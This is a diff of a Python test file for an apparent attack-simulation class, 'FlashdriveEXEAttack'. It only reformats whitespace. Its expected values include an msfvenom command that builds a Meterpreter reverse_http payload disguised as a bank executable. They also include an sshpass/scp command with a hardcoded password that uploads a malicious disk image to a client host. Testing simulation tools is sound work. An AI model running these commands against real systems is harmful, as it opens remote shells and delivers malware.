@@ -34,8 +34,8 @@ class TestFlashdriveEXEAttack:
     def test_generate_exe_command(self, attack: FlashdriveEXEAttack):
         exe_command = attack._generate_exe_command()
         expected_exe_command = (
-        	"msfvenom -p windows/x64/meterpreter/reverse_http LHOST=172.18.0.3 "
-        	"LPORT=80 -a x64 StagerRetryCount=604800 -f exe-only -o /root/Bank-of-Nuthington.exe")
+            "msfvenom -p windows/x64/meterpreter/reverse_http LHOST=172.18.0.3 "
+            "LPORT=80 -a x64 StagerRetryCount=604800 -f exe-only -o /root/Bank-of-Nuthington.exe")
         assert exe_command == expected_exe_command
 
     def test_generate_image_commands(self, attack: FlashdriveEXEAttack):
@@ -53,9 +53,9 @@ class TestFlashdriveEXEAttack:
     def test_upload_image_to_client_command(self, attack: FlashdriveEXEAttack):
         upload_command = attack._upload_image_to_client_command()
         expected_upload_command = (
-        	"sshpass -p 'breach' scp /root/evil_image_file.img "
-        	"ssh@192.168.56.101:/BREACH/ && echo 'Image file successfully sent'")
-            
+            "sshpass -p 'breach' scp /root/evil_image_file.img "
+            "ssh@192.168.56.101:/BREACH/ && echo 'Image file successfully sent'")
+
         assert upload_command == expected_upload_command
 
     def test_raise_exception_bad_output(self, attack: FlashdriveEXEAttack):
